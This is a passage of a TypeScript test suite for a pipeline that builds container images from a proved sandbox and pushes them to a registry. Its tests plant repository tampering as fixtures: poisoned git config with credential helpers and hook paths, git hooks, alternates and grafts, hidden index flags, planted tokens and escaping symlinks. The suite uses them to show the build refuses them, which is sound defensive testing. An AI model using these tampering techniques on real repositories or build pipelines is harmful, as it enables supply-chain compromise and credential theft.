// SH22: the saved image build. An image is built only from the fresh sandbox of a PASSING Prove run of the APPROVED environment, at the default branch head, with no secret in the tree; it is pushed with a short-lived
// login for one repository; the digest is the registry's answer for that repository. Every failure is a fixed word, and nothing is left behind.
import { execFileSync } from "node:child_process";
import { existsSync, readFileSync } from "node:fs";
import { chmod, mkdir, mkdtemp, readFile, readdir, readlink, realpath, rm, writeFile, symlink, lstat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  SAVED_ENV_BUILD_FAILURES, SavedEnvBuildResultSchema, SavedEnvImageManifestSchema, formatCommandLine, parseCommandLine, savedEnvRepositoryName, testEnvDigest,
  type ProjectCommand, type SavedEnvRegistryAuth, type TestEnvironmentBody,
} from "../../packages/contracts/src/index.js";
import { buildEnvironmentDraft } from "../../packages/worker/src/env-detect/propose.js";
import { emptyDetection } from "../../packages/worker/src/env-detect/types.js";
import type { ProveCommandResult } from "../../packages/worker/src/prove.js";
import type { DockerCli } from "../../packages/worker/src/swebench/containers.js";
import { fsckOf, gitStateOf, hashWithAttributesOf, installGitInto, proveAndBuildSavedImage, rebuildIndexOf, savedEnvDockerfile, savedEnvTag, snapshotGitOf, stageTree, trackedTreeOf, type BuildSandbox, type SavedEnvBuildInput, type SavedEnvBuildPorts } from "../../packages/worker/src/saved-env/build.js";
import { expectedEnvironmentKey } from "../../packages/broker/src/test-env/saved-env-key.js";
import { scanTreeForSecrets } from "../../packages/worker/src/saved-env/secret-scan.js";

const cleanup: string[] = [];
afterEach(async () => { await Promise.all(cleanup.splice(0).map((dir) => rm(dir, { recursive: true, force: true }))); });
const scratch = async (): Promise<string> => { const dir = await mkdtemp(join(tmpdir(), "saved-env-build-")); cleanup.push(dir); return dir; };

const REGISTRY = "111122223333.dkr.ecr.us-west-2.amazonaws.com";
const REPOSITORY = savedEnvRepositoryName({ env: "test", orgId: "org-1", projectId: "proj-1" });
const OTHER_REPOSITORY = savedEnvRepositoryName({ env: "test", orgId: "org-1", projectId: "proj-2" });
const BASE_DIGEST = `sha256:${"b".repeat(64)}`;
const IMAGE_DIGEST = `sha256:${"d".repeat(64)}`;
const NOW = Date.parse("2026-11-02T12:00:00Z");
const PASSWORD = ["login", "-", "p".repeat(30)].join("");
const ORIGIN = "https://github.com/acme/svc.git";

const cmd = (line: string, timeoutSeconds = 900): ProjectCommand => parseCommandLine(line, "svc", timeoutSeconds);
function environment(): TestEnvironmentBody {
  const detection = emptyDetection();
  detection.setupCommands.push({ value: cmd("npm ci"), source: { path: "README.md", line: 3 } });
  detection.checks.push({ value: { id: "unit", label: "unit", command: cmd("npm test", 1_800), kind: "test", reportPath: "out/junit.xml" }, source: { path: "package.json", line: 5 } });
  const draft = buildEnvironmentDraft(detection, { repositoryId: "svc" });
  if ("ok" in draft) throw new Error("draft");
  return draft.environment;
}

const git = (cwd: string, ...args: string[]): string => execFileSync("git", args, { cwd, encoding: "utf8", env: { PATH: process.env["PATH"] ?? "", HOME: cwd, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.test", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.test" } }).trim();

const FILES: Record<string, string> = { "package.json": '{"name":"svc"}\n', "package-lock.json": "{}\n", "src/index.js": "module.exports = 1;\n", "run.sh": "#!/bin/sh\necho hi\n", ".gitignore": "node_modules\n" };

/** A real clone-like repository: committed files, an origin URL, and `refs/remotes/origin/main` at HEAD (what the worker's own clone has). Dependencies are untracked. */
async function makeRepository(root: string, over: { origin?: string; files?: Record<string, string>; links?: Record<string, string> } = {}): Promise<string> {
  const dir = join(root, "svc");
  await mkdir(dir, { recursive: true });
  git(dir, "init", "-q", "-b", "main");
  for (const [name, content] of Object.entries(over.files ?? FILES)) { await mkdir(join(dir, name, ".."), { recursive: true }); await writeFile(join(dir, name), content); }
  await chmod(join(dir, "run.sh"), 0o755);
  for (const [name, target] of Object.entries(over.links ?? {})) await symlink(target.replace("{ROOT}", await realpath(root)), join(dir, name));
  git(dir, "add", "-A");
  git(dir, "commit", "-q", "-m", "one");
  git(dir, "remote", "add", "origin", over.origin ?? ORIGIN);
  const commit = git(dir, "rev-parse", "HEAD");
  git(dir, "update-ref", "refs/remotes/origin/main", commit);
  await mkdir(join(dir, "node_modules", "dep"), { recursive: true });
  await writeFile(join(dir, "node_modules", "dep", "index.js"), "x\n");
  return commit;
}

interface Recorded { calls: string[][]; contexts: Array<{ links: Record<string, string>; files: string[]; dockerfile: string; manifest: string; gitConfig: string | undefined; gitEntries: string[]; configDuringPush?: string | undefined }>; }
function fakeDocker(rec: Recorded, over: { build?: number; push?: number; create?: number; inspect?: (args: string[]) => string; tag?: number; digestRepository?: string } = {}): DockerCli {
  return {
    async run(args) {
      const list = [...args];
      rec.calls.push(list);
      const ok = { exitCode: 0, stdout: "", stderr: "" };
      if (list[0] === "buildx" && list[1] === "create") return { ...ok, exitCode: over.create ?? 0 };
      if (list[0] === "buildx" && list[1] === "build") {
        const context = list[list.length - 1]!;
        const files: string[] = [];
        const links: Record<string, string> = {};
        const walk = async (dir: string, prefix: string): Promise<void> => {
          for (const entry of await readdir(dir, { withFileTypes: true })) {
            const rel = prefix === "" ? entry.name : `${prefix}/${entry.name}`;
            files.push(rel);
            if (entry.isSymbolicLink()) links[rel] = await readlink(join(dir, entry.name));
            if (entry.isDirectory()) await walk(join(dir, entry.name), rel);
          }
        };
        await walk(context, "");
        const gitDir = join(context, "seed", "svc", ".git");
        rec.contexts.push({
          links, files, dockerfile: await readFile(join(context, "Dockerfile"), "utf8"), manifest: await readFile(join(context, "manifest.json"), "utf8"),
          gitConfig: await readFile(join(gitDir, "config"), "utf8").catch(() => undefined), gitEntries: await readdir(gitDir).catch(() => []),
        });
        return { ...ok, exitCode: over.build ?? 0 };
      }
      if (list[0] === "tag") return { ...ok, exitCode: over.tag ?? 0 };
      if (list[2] === "push") {
        const dir = list[list.indexOf("--config") + 1]!;
        rec.contexts.at(-1)!.configDuringPush = await readFile(join(dir, "config.json"), "utf8").catch(() => undefined);
        return { ...ok, exitCode: over.push ?? 0 };
      }
      if (list[0] === "image" && list[1] === "inspect") {
        if (over.inspect !== undefined) return { ...ok, stdout: over.inspect(list) };
        const remote = list[list.length - 1]!;
        const repo = over.digestRepository ?? remote.slice(0, remote.lastIndexOf(":"));
        return { ...ok, stdout: JSON.stringify([`${repo}@${IMAGE_DIGEST}`]) };
      }
      return ok;
    },
  };
}

interface World {
  input: SavedEnvBuildInput; ports: SavedEnvBuildPorts; rec: Recorded; log: string[]; fresh: { disposed: number; stopped: number; root: string }; sessions: number; temp: string[]; commit: string; dir: string;
}

async function world(over: {
  docker?: Parameters<typeof fakeDocker>[1]; env?: TestEnvironmentBody; approvedDigest?: string; session?: () => Promise<SavedEnvRegistryAuth | undefined>;
  notFrom?: SavedEnvBuildInput["notFrom"]; forbidden?: string[]; makeFreshThrows?: boolean; stopThrows?: boolean; origin?: string; files?: Record<string, string>;
  /** Runs in place of the project's commands, inside the "sandbox": it may rewrite the workspace, `.git` included. */
  during?: (dir: string) => Promise<void> | void;
  /** Runs right after the fresh clone is made, before anything else (a clone that already holds something). */
  afterClone?: (dir: string) => Promise<void> | void;
  /** Makes the sandbox report that it already started a process when it is handed over. */
  alreadyStarted?: boolean;
  links?: SavedEnvBuildInput["links"];
  declaredFolders?: string[];
  provePasses?: boolean; commitOverride?: string; builderImage?: string;
  /** Committed symbolic links (`{ROOT}` in a target is the workspace root). */
  trackedLinks?: Record<string, string>;
} = {}): Promise<World> {
  const rec: Recorded = { calls: [], contexts: [] };
  const log: string[] = [];
  const root = await scratch();
  const tempParent = await scratch();
  const fresh = { disposed: 0, stopped: 0, root };
  const dir = join(root, "svc");
  const commit = await makeRepository(root, { ...(over.origin === undefined ? {} : { origin: over.origin }), ...(over.files === undefined ? {} : { files: over.files }), ...(over.trackedLinks === undefined ? {} : { links: over.trackedLinks }) });
  await over.afterClone?.(dir);
  const env = over.env ?? environment();
  let t = 1_000_000;
  let ran = false;
  let started = over.alreadyStarted === true;
  const sandbox: BuildSandbox = {
    id: "fresh-1", rootPath: root,
    hasStarted: () => started,
    start: async () => { started = true; log.push("started"); },
    dispose: async () => { fresh.disposed += 1; log.push("disposed"); },
    stopProcesses: async () => { log.push("stopped"); fresh.stopped += 1; if (over.stopThrows === true) throw new Error("cannot stop"); },
    ports: {
      runCommand: async (command): Promise<ProveCommandResult> => { if (!started) throw new Error("the sandbox was not started"); log.push(formatCommandLine(command)); t += 1_000; if (!ran) { ran = true; await over.during?.(dir); } return { exitCode: over.provePasses === false ? 1 : 0, timedOut: false, stdout: "", stderr: "" }; },
      startMock: async () => undefined, probePreprod: async () => true, mockUnmatched: async () => [], buildCoverageMap: async () => undefined, suiteTestCount: async () => 3, now: () => t,
    },
  };
  const world: World = { rec, log, fresh, sessions: 0, temp: [], commit, dir, input: undefined as never, ports: undefined as never };
  world.ports = {
    docker: fakeDocker(rec, over.docker),
    makeFresh: async () => { if (over.makeFreshThrows === true) throw new Error("no"); return sandbox; },
    snapshotGit: async (repo, dest) => { log.push("snapshot"); await snapshotGitOf(repo, dest); },
    gitState: gitStateOf,
    rebuildIndex: rebuildIndexOf,
    trackedTree: trackedTreeOf,
    stage: async (src, dst, policy) => { log.push("stage"); await stageTree(src, dst, policy); },
    fsck: async (dir2) => { log.push("fsck"); await fsckOf(dir2); },
    hashWithAttributes: hashWithAttributesOf,
    installGit: installGitInto,
    scan: (dir2, options) => scanTreeForSecrets(dir2, { forbiddenValues: options.forbiddenValues, deadlineAtMs: Date.now() + options.budgetMs, links: options.links }),
    pushSession: async () => { world.sessions += 1; return over.session === undefined ? { registry: REGISTRY, repository: REPOSITORY, username: "AWS", password: PASSWORD, expiresAt: new Date(NOW + 900_000).toISOString() } : over.session(); },
    temporaryFolder: async () => { const d = await mkdtemp(join(tempParent, "t-")); world.temp.push(d); return { path: d, remove: () => rm(d, { recursive: true, force: true }) }; },
    now: () => NOW,
    random: () => "0123456789abcdef",
  };
  world.input = {
    repository: REPOSITORY, environment: env, approved: { revision: 4, digest: over.approvedDigest ?? testEnvDigest(env) },
    repositories: [{ repositoryId: "svc", directory: "svc", defaultBranch: "main", commit: over.commitOverride ?? commit }],
    detectorGlobs: [], secretNames: ["PUBLISH_TOKEN"], baseImageDigest: BASE_DIGEST, notFrom: over.notFrom ?? [{ id: "task-1", rootPath: "/mnt/task-1" }], forbiddenValues: over.forbidden ?? [],
    signal: new AbortController().signal, proveDeadlineMs: 3_600_000, ...(over.builderImage === undefined ? {} : { builderImage: over.builderImage }),
    ...(over.links === undefined ? {} : { links: over.links }), ...(over.declaredFolders === undefined ? {} : { declaredFolders: over.declaredFolders }),
  };
  return world;
}

const dockerVerbs = (rec: Recorded) => rec.calls.map((call) => (call[0] === "--config" ? call[2] : call[0] === "image" ? "inspect" : call[0] === "buildx" ? `buildx ${call[1]}` : call[0]));

describe("a passing, approved, default-branch build", () => {
  it("snapshots the clone's .git before the Prove run, proves in the fresh sandbox, stops it, then stages and builds, and returns the registry's digest and a manifest", async () => {
    const w = await world();
    const result = await proveAndBuildSavedImage(w.input, w.ports);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(SavedEnvBuildResultSchema.safeParse(result).success).toBe(true);
    expect(result.imageDigest).toBe(IMAGE_DIGEST);
    expect(result.repository).toBe(REPOSITORY);
    expect(result.manifest).toMatchObject({ schemaVersion: 1, testEnvRevision: 4, imageDigest: IMAGE_DIGEST, commits: [{ repositoryId: "svc", sha: w.commit }] });
    expect(result.manifest.builtAt).toBe("2026-11-02T12:00:00.000Z");
    // the order that makes the checks mean something: trusted .git first, then the project's commands, then the sandbox stops, then the copy is made
    expect(w.log).toEqual(["snapshot", "fsck", "started", "npm ci", "npm test", "stopped", "stage", "disposed"]);
    expect(dockerVerbs(w.rec)).toEqual(["buildx create", "buildx build", "tag", "push", "inspect", "buildx rm", "rmi", "rmi"]);
    expect(result.tag).toMatch(/^k[a-f0-9]{16}-20261102120000-01234567$/u);
  });

  it("the image is FROM scratch: a COPY of the seed and the manifest and labels; no RUN, ENV, ARG or ADD; built with no network, no cache and nothing pulled, in a builder of its own that is removed", async () => {
    const w = await world();
    await proveAndBuildSavedImage(w.input, w.ports);
    const { dockerfile } = w.rec.contexts[0]!;
    expect(dockerfile.split("\n").filter((line) => line !== "").map((line) => line.split(" ")[0])).toEqual(["FROM", "COPY", "COPY", "LABEL"]);
    expect(dockerfile).toMatch(/^FROM scratch$/mu);
    expect(dockerfile).not.toMatch(/\b(RUN|ENV|ARG|ADD|ENTRYPOINT|CMD|USER|EXPOSE)\b/u);
    const build = w.rec.calls.find((call) => call[0] === "buildx" && call[1] === "build")!;
    expect(build).toEqual(expect.arrayContaining(["--network", "none", "--pull=false", "--no-cache", "--load", "--builder"]));
    const create = w.rec.calls.find((call) => call[1] === "create")!;
    const remove = w.rec.calls.find((call) => call[1] === "rm")!;
    expect(create[3]).toBe(remove[remove.length - 1]);
    expect(create).toContain("--bootstrap");
    expect(create[3]).toBe(build[build.indexOf("--builder") + 1]);
  });

  it("the builder is removed when the build fails, too, and a builder that cannot be made builds nothing", async () => {
    const failing = await world({ docker: { build: 1 } });
    expect(await proveAndBuildSavedImage(failing.input, failing.ports)).toEqual({ ok: false, reason: "build_failed" });
    expect(failing.rec.calls.some((call) => call[0] === "buildx" && call[1] === "rm")).toBe(true);
    const none = await world({ docker: { create: 1 } });
    expect(await proveAndBuildSavedImage(none.input, none.ports)).toEqual({ ok: false, reason: "build_failed", step: "builder" });
    expect(none.rec.calls.some((call) => call[1] === "build")).toBe(false);
    expect(none.rec.calls.some((call) => call[0] === "buildx" && call[1] === "rm")).toBe(true);
  });

  it("a pinned builder image is passed to the builder; an unpinned one is refused", async () => {
    const pinned = await world({ builderImage: `registry.example.com/mirror/buildkit@sha256:${"a".repeat(64)}` });
    await proveAndBuildSavedImage(pinned.input, pinned.ports);
    expect(pinned.rec.calls.find((call) => call[1] === "create")).toEqual(expect.arrayContaining(["--driver-opt", `image=registry.example.com/mirror/buildkit@sha256:${"a".repeat(64)}`]));
    const loose = await world({ builderImage: "moby/buildkit:latest" });
    expect(await proveAndBuildSavedImage(loose.input, loose.ports)).toMatchObject({ ok: false });
    expect(loose.rec.calls).toEqual([]);
  });

  it("the build context holds the work tree with its dependencies and caches, the TRUSTED .git with a generated config and no hooks and no credential, and a manifest with no digest and no secret name", async () => {
    const w = await world();
    await proveAndBuildSavedImage(w.input, w.ports);
    const context = w.rec.contexts[0]!;
    expect(context.files).toEqual(expect.arrayContaining(["Dockerfile", "manifest.json", "seed/svc/package.json", "seed/svc/node_modules/dep/index.js", "seed/svc/.git/config", "seed/svc/.git/HEAD", "seed/svc/.git/index"]));
    expect(context.files.filter((file) => file.startsWith("seed/svc/.git/hooks"))).toEqual([]);
    expect(context.gitConfig).toContain(`url = ${ORIGIN}`);
    expect(context.gitConfig!.split("\n").filter((line) => line.trim().startsWith("[")).sort()).toEqual(["[core]", '[remote "origin"]']);
    const manifest = SavedEnvImageManifestSchema.parse(JSON.parse(context.manifest));
    expect(manifest.commits).toEqual([{ repositoryId: "svc", sha: w.commit }]);
    expect(context.manifest).not.toContain("imageDigest");
    expect(context.manifest).not.toContain("PUBLISH_TOKEN");
  });

  it("the push login is written to a throwaway Docker config for the push alone, is never an argument, and nothing is left behind", async () => {
    const w = await world();
    await proveAndBuildSavedImage(w.input, w.ports);
    const push = w.rec.calls.find((call) => call.includes("push"))!;
    expect(push[0]).toBe("--config");
    expect(push[push.length - 1]).toMatch(new RegExp(`^${REGISTRY.replace(/\./gu, "\\.")}/${REPOSITORY.replace(/\//gu, "\\/")}:k[a-f0-9]{16}-`, "u"));
    const configText = w.rec.contexts[0]!.configDuringPush!;
    expect(Buffer.from((JSON.parse(configText) as { auths: Record<string, { auth: string }> }).auths[REGISTRY]!.auth, "base64").toString()).toBe(`AWS:${PASSWORD}`);
    expect(JSON.stringify(w.rec.calls)).not.toContain(PASSWORD);
    expect(w.sessions).toBe(1);
    expect(w.temp.every((dir) => !existsSync(dir))).toBe(true);
    expect(w.fresh.disposed).toBe(1);
  });

  it("asks for the login only after the image is built, so a build that fails never holds a session", async () => {
    const w = await world({ docker: { build: 1 } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "build_failed" });
    expect(w.sessions).toBe(0);
  });
});

describe("the sandbox cannot talk the build into a different tree (review F4)", () => {
  it("1. every process of the sandbox is stopped before the copy is made, and a sandbox that cannot be stopped builds nothing", async () => {
    const w = await world();
    await proveAndBuildSavedImage(w.input, w.ports);
    expect(w.log.indexOf("stopped")).toBeGreaterThan(w.log.indexOf("npm test"));
    expect(w.log.indexOf("stopped")).toBeLessThan(w.log.indexOf("stage"));
    const stuck = await world({ stopThrows: true });
    expect(await proveAndBuildSavedImage(stuck.input, stuck.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "stop" });
    expect(stuck.log).not.toContain("stage");
    expect(stuck.rec.calls.filter((call) => call[1] === "build")).toEqual([]);
  });

  it("2 and 6. the live .git is never used: alternates, a graft, replace refs, a new HEAD and a poisoned config written during the Prove run do not reach the image; the trusted .git does", async () => {
    const w = await world({
      during: async (dir) => {
        await mkdir(join(dir, ".git", "objects", "info"), { recursive: true });
        await writeFile(join(dir, ".git", "objects", "info", "alternates"), "/somewhere/else/objects\n");
        await mkdir(join(dir, ".git", "info"), { recursive: true });
        await writeFile(join(dir, ".git", "info", "grafts"), `${"a".repeat(40)} ${"b".repeat(40)}\n`);
        await mkdir(join(dir, ".git", "refs", "replace"), { recursive: true });
        await writeFile(join(dir, ".git", "refs", "replace", "c".repeat(40)), `${"d".repeat(40)}\n`);
        await writeFile(join(dir, ".git", "HEAD"), `${"e".repeat(40)}\n`);
        await writeFile(join(dir, ".git", "config"), `[credential]\n\thelper = store\n[remote "origin"]\n\turl = https://ci:${"p".repeat(12)}@git.example.com/o/r.git\n[core]\n\thooksPath = /tmp/evil\n`);
        await mkdir(join(dir, ".git", "hooks"), { recursive: true });
        await writeFile(join(dir, ".git", "hooks", "post-checkout"), "#!/bin/sh\necho pwned\n");
      },
    });
    const result = await proveAndBuildSavedImage(w.input, w.ports);
    expect(result.ok).toBe(true);
    const context = w.rec.contexts[0]!;
    expect(context.gitEntries).not.toContain("hooks");
    expect(context.files.some((file) => file.includes("alternates") || file.includes("grafts") || file.includes("refs/replace"))).toBe(false);
    expect(context.gitConfig).not.toContain("credential");
    expect(context.gitConfig).not.toContain("hooksPath");
    expect(context.gitConfig).toContain(ORIGIN);
    expect(readFileSync(join(w.dir, ".git", "HEAD"), "utf8")).toContain("e".repeat(40));
    expect(context.files).toContain("seed/svc/.git/HEAD");
  });

  it("3. the checkout is compared with the trusted HEAD tree: a tracked file changed, deleted, made executable, replaced by a link or by a directory is refused", async () => {
    const changes: Array<[string, (dir: string) => Promise<void>]> = [
      ["content", async (dir) => { await writeFile(join(dir, "src", "index.js"), "module.exports = 2;\n"); }],
      ["missing", async (dir) => { await rm(join(dir, "package-lock.json")); }],
      ["mode (made executable)", async (dir) => { await chmod(join(dir, "src", "index.js"), 0o755); }],
      ["mode (lost the executable bit)", async (dir) => { await chmod(join(dir, "run.sh"), 0o644); }],
      ["a link where a file belongs", async (dir) => { await rm(join(dir, "package.json")); await symlink("package-lock.json", join(dir, "package.json")); }],
      ["a directory where a file belongs", async (dir) => { await rm(join(dir, "package.json")); await mkdir(join(dir, "package.json")); }],
      ["a directory on the way replaced by a link", async (dir) => { await rm(join(dir, "src"), { recursive: true }); await symlink("node_modules/dep", join(dir, "src")); }],
    ];
    for (const [name, change] of changes) {
      const w = await world({ during: change });
      const result = await proveAndBuildSavedImage(w.input, w.ports);
      expect(result, name).toMatchObject({ ok: false, reason: "not_default_branch" });
      expect(w.rec.calls.filter((call) => call[1] === "build"), name).toEqual([]);
    }
  });

  it("3. a flag in the index that hides a change (assume-unchanged) is refused when the clone carries it, and a change made under such a flag during the run is refused by the byte comparison", async () => {
    const flagged = await world({ afterClone: (dir) => { git(dir, "update-index", "--assume-unchanged", "src/index.js"); } });
    expect(await proveAndBuildSavedImage(flagged.input, flagged.ports)).toEqual({ ok: false, reason: "not_default_branch" });
    expect(flagged.log).not.toContain("npm ci");
    const hidden = await world({ during: async (dir) => { git(dir, "update-index", "--assume-unchanged", "src/index.js"); await writeFile(join(dir, "src", "index.js"), "evil();\n"); } });
    expect(await proveAndBuildSavedImage(hidden.input, hidden.ports)).toMatchObject({ ok: false, reason: "not_default_branch" });
  });

  it("4. a clone that already holds alternates, http-alternates, replace refs, grafts, modules or worktrees is refused before the Prove run", async () => {
    const entries: Array<[string, (git: string) => Promise<void>]> = [
      ["objects/info/alternates", async (g) => { await writeFile(join(g, "objects", "info", "alternates"), "/x\n"); }],
      ["objects/info/http-alternates", async (g) => { await writeFile(join(g, "objects", "info", "http-alternates"), "https://x\n"); }],
      ["refs/replace", async (g) => { await mkdir(join(g, "refs", "replace"), { recursive: true }); }],
      ["info/grafts", async (g) => { await mkdir(join(g, "info"), { recursive: true }); await writeFile(join(g, "info", "grafts"), "x\n"); }],
      ["modules", async (g) => { await mkdir(join(g, "modules"), { recursive: true }); }],
      ["worktrees", async (g) => { await mkdir(join(g, "worktrees"), { recursive: true }); }],
    ];
    for (const [name, plant] of entries) {
      const w = await world({ afterClone: async (dir) => { await mkdir(join(dir, ".git", "objects", "info"), { recursive: true }); await plant(join(dir, ".git")); } });
      expect(await proveAndBuildSavedImage(w.input, w.ports), name).toEqual({ ok: false, reason: "unsafe_tree", step: "git" });
      expect(w.log, name).not.toContain("npm ci");
    }
  });

  it("5. the origin URL is the only thing the staged config keeps, and a clone whose origin holds a credential is refused", async () => {
    const credentialed = await world({ origin: `https://x-access-token:${"p".repeat(20)}@github.com/acme/svc.git` });
    expect(await proveAndBuildSavedImage(credentialed.input, credentialed.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "origin" });
    const ssh = await world({ origin: "git@github.com:acme/svc.git" });
    expect((await proveAndBuildSavedImage(ssh.input, ssh.ports)).ok).toBe(true);
    expect(ssh.rec.contexts[0]!.gitConfig).toContain("url = git@github.com:acme/svc.git");
  });

  it("the head must be the broker's commit and the origin ref must be it too; a clone that is not at the default branch head is refused before the Prove run", async () => {
    const wrongCommit = await world({ commitOverride: "a".repeat(40) });
    expect(await proveAndBuildSavedImage(wrongCommit.input, wrongCommit.ports)).toEqual({ ok: false, reason: "not_default_branch" });
    expect(wrongCommit.log).not.toContain("npm ci");
    const behind = await world({ afterClone: (dir) => { git(dir, "update-ref", "-d", "refs/remotes/origin/main"); } });
    expect(await proveAndBuildSavedImage(behind.input, behind.ports)).toEqual({ ok: false, reason: "not_default_branch" });
  });

  it("untracked dependency and cache folders are free; a clone that is a link or a file for .git is refused", async () => {
    const free = await world({ during: async (dir) => { await writeFile(join(dir, "node_modules", "dep", "new.js"), "y\n"); } });
    expect((await proveAndBuildSavedImage(free.input, free.ports)).ok).toBe(true);
    expect(free.rec.contexts[0]!.files).toContain("seed/svc/node_modules/dep/new.js");
    const gitfile = await world({ afterClone: async (dir) => { await rm(join(dir, ".git"), { recursive: true }); await writeFile(join(dir, ".git"), "gitdir: /elsewhere\n"); } });
    expect(await proveAndBuildSavedImage(gitfile.input, gitfile.ports)).toMatchObject({ ok: false });
    expect(gitfile.log).not.toContain("npm ci");
  });

  it("the key is worked out from the staged copy", async () => {
    const a = await world();
    const b = await world({ files: { ...FILES, "package-lock.json": '{"lockfileVersion":3}\n' } });
    const [ra, rb] = [await proveAndBuildSavedImage(a.input, a.ports), await proveAndBuildSavedImage(b.input, b.ports)];
    expect(ra.ok && rb.ok).toBe(true);
    if (ra.ok && rb.ok) expect(ra.manifest.environmentKey).not.toBe(rb.manifest.environmentKey);
  });
});

describe("what stops a build", () => {
  const expectNothingBuilt = (w: World) => { expect(w.rec.calls.filter((call) => call[1] === "build" || call.includes("push"))).toEqual([]); expect(w.sessions).toBe(0); };

  it("an environment that is not the approved one (digest differs) never even makes a sandbox", async () => {
    const w = await world({ approvedDigest: "e".repeat(64) });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "not_approved" });
    expect(w.log).toEqual([]);
    expect(w.fresh.disposed).toBe(0);
    expectNothingBuilt(w);
  });

  it("a sandbox that shares an id or a workspace with a task or the setup agent is refused", async () => {
    const same = await world({ notFrom: [{ id: "fresh-1", rootPath: "/elsewhere" }] });
    expect(await proveAndBuildSavedImage(same.input, same.ports)).toEqual({ ok: false, reason: "not_fresh" });
    expectNothingBuilt(same);
    const inside = await world();
    inside.input = { ...inside.input, notFrom: [{ id: "task-9", rootPath: inside.fresh.root }] };
    expect(await proveAndBuildSavedImage(inside.input, inside.ports)).toEqual({ ok: false, reason: "not_fresh" });
    expect(inside.fresh.disposed).toBe(1);
    expectNothingBuilt(inside);
  });

  it("a sandbox that cannot be made, or a Prove that did not pass, builds nothing", async () => {
    const none = await world({ makeFreshThrows: true });
    expect(await proveAndBuildSavedImage(none.input, none.ports)).toEqual({ ok: false, reason: "fresh_sandbox_failed" });
    const failing = await world({ provePasses: false });
    expect(await proveAndBuildSavedImage(failing.input, failing.ports)).toEqual({ ok: false, reason: "not_proved" });
    expect(failing.fresh.disposed).toBe(1);
    expect(failing.log).not.toContain("stopped");
    expectNothingBuilt(failing);
  });

  it("a secret in what would be shipped ends the build before docker is run: a token in a dependency, a .env in a cache folder, a value the machine held", async () => {
    const token = ["gh", "p_", "a".repeat(36)].join("");
    const held = ["clone", "-", "w".repeat(24)].join("");
    const plants: Array<(dir: string) => Promise<void>> = [
      async (dir) => { await writeFile(join(dir, "node_modules", "dep", "ci.js"), `const t = "${token}";\n`); },
      async (dir) => { await mkdir(join(dir, "__pycache__"), { recursive: true }); await writeFile(join(dir, "__pycache__", ".env"), "A=1\n"); },
      async (dir) => { await writeFile(join(dir, "node_modules", "dep", "state.json"), `{"c":"${held}"}`); },
    ];
    for (const during of plants) {
      const w = await world({ during, forbidden: [held] });
      expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "secrets_found" });
      expect(w.rec.calls).toEqual([]);
      expect(w.temp.every((dir) => !existsSync(dir))).toBe(true);
    }
  });

  it("a link in the tree that is absolute or leaves the seed ends the build (review F9); one that stays inside is kept", async () => {
    const absolute = await world({ during: async (dir) => { await symlink("/usr/bin/python3", join(dir, "node_modules", "python")); } });
    expect(await proveAndBuildSavedImage(absolute.input, absolute.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
    const escaping = await world({ during: async (dir) => { await symlink("../../../outside", join(dir, "node_modules", "up")); } });
    expect(await proveAndBuildSavedImage(escaping.input, escaping.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
    const inside = await world({ during: async (dir) => { await symlink("dep/index.js", join(dir, "node_modules", "alias")); } });
    expect((await proveAndBuildSavedImage(inside.input, inside.ports)).ok).toBe(true);
    expect(absolute.rec.calls).toEqual([]);
  });

  it("no push login, a login for another repository, or one about to expire: no push", async () => {
    const other = await world({ session: async () => ({ registry: REGISTRY, repository: OTHER_REPOSITORY, username: "AWS", password: PASSWORD, expiresAt: new Date(NOW + 900_000).toISOString() }) });
    expect(await proveAndBuildSavedImage(other.input, other.ports)).toEqual({ ok: false, reason: "no_push_session" });
    const none = await world({ session: async () => undefined });
    expect(await proveAndBuildSavedImage(none.input, none.ports)).toEqual({ ok: false, reason: "no_push_session" });
    const late = await world({ session: async () => ({ registry: REGISTRY, repository: REPOSITORY, username: "AWS", password: PASSWORD, expiresAt: new Date(NOW + 30_000).toISOString() }) });
    expect(await proveAndBuildSavedImage(late.input, late.ports)).toEqual({ ok: false, reason: "no_push_session" });
    for (const w of [other, none, late]) expect(w.rec.calls.some((call) => call.includes("push"))).toBe(false);
    // a push login of an hour (the push session length) with 61 seconds left is enough; with 59 it is not
    const edge = await world({ session: async () => ({ registry: REGISTRY, repository: REPOSITORY, username: "AWS", password: PASSWORD, expiresAt: new Date(NOW + 61_000).toISOString() }) });
    expect((await proveAndBuildSavedImage(edge.input, edge.ports)).ok).toBe(true);
  });

  it("a failed push removes the login, the builder and the local images", async () => {
    const w = await world({ docker: { push: 1 } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "push_failed" });
    expect(w.temp.every((dir) => !existsSync(dir))).toBe(true);
    expect(w.rec.calls.filter((call) => call[0] === "rmi")).toHaveLength(2);
    expect(w.rec.calls.filter((call) => call[0] === "buildx" && call[1] === "rm")).toHaveLength(1);
  });

  it("a digest that belongs to another repository, or two digests, or none, is not accepted", async () => {
    for (const docker of [{ digestRepository: `${REGISTRY}/${OTHER_REPOSITORY}` }, { inspect: () => "[]" }, { inspect: () => "not json" }, { inspect: () => JSON.stringify([`${REGISTRY}/${REPOSITORY}@${IMAGE_DIGEST}`, `${REGISTRY}/${REPOSITORY}@sha256:${"9".repeat(64)}`]) }]) {
      const w = await world({ docker });
      const result = await proveAndBuildSavedImage(w.input, w.ports);
      expect(result).toMatchObject({ ok: false, reason: "digest_mismatch" });
    }
  });

  it("input that is not a repository name or a plain folder is refused as not approved", async () => {
    const w = await world();
